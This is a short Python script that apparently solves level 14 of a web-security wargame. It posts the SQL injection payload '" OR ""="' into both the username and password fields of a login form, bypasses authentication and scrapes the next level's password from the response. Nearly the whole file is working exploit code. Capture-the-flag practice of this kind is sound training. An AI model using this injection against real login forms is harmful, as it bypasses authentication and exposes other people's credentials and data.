#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials

level_url = credentials[14]["url"]
level_username = credentials[14]["level"]
level_password = credentials[14]["password"]

next_level_url = credentials[15]["url"]
next_level_username = credentials[15]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

payload = '" OR ""="'

post_data = {"username":payload, "password":payload}
response = requests.post(level_url, headers=heads, data=post_data)

data = response.text
strings = re.split('\n|:|\s|<|>', data)
next_password = strings[strings.index(next_level_username) + 2]

print(next_password)
